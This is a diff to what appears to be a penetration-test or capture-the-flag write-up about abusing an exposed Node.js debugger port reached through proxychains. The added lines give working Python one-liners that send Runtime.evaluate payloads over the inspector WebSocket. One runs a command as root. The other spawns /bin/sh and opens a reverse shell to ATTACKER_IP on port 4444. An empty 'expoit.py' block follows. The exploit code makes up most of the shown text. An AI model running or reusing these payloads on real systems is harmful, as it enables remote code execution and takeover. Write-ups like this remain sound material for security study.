@@ -334,15 +334,27 @@ reach it via `process.mainModule.require`.
 proxychains curl -s http://127.0.0.1:9229/json/list      # -> webSocketDebuggerUrl
 ```
 
-```python
-# command execution as root (through proxychains):
-import json, urllib.request, websocket
-ws = json.load(urllib.request.urlopen("http://127.0.0.1:9229/json/list"))[0]["webSocketDebuggerUrl"]
-c = websocket.create_connection(ws)
-c.send(json.dumps({"id":1,"method":"Runtime.evaluate","params":{
-    "expression":"process.mainModule.require('child_process').execSync('id').toString()",
-    "returnByValue":True}}))
+```bash
+proxychains python3 -c '
+import json,urllib.request,websocket
+ws=json.load(urllib.request.urlopen("http://127.0.0.1:9229/json/list"))[0]["webSocketDebuggerUrl"]
+c=websocket.create_connection(ws)
+c.send(json.dumps({"id":1,"method":"Runtime.evaluate","params":{"expression":"process.mainModule.require(\"child_process\").execSync(\"id\").toString()","returnByValue":True}}))
 print(c.recv())
+'
+
+proxychains python3 -c '
+import json,urllib.request,websocket
+ws=json.load(urllib.request.urlopen("http://127.0.0.1:9229/json/list"))[0]["webSocketDebuggerUrl"]
+c=websocket.create_connection(ws)
+c.send(json.dumps({"id":1,"method":"Runtime.evaluate","params":{"expression":"(function(){var R=process.mainModule.require;var net=R(\"net\"),cp=R(\"child_process\"),sh=cp.spawn(\"/bin/sh\",[]);var s=new net.Socket();s.connect(4444,\"ATTACKER_IP\",function(){s.pipe(sh.stdin);sh.stdout.pipe(s);sh.stderr.pipe(s);});return /a/;})()"}}))
+print("wyslane")
+'
+```
+
+expoit.py
+```py
+
 ```
 
 <p align="center">
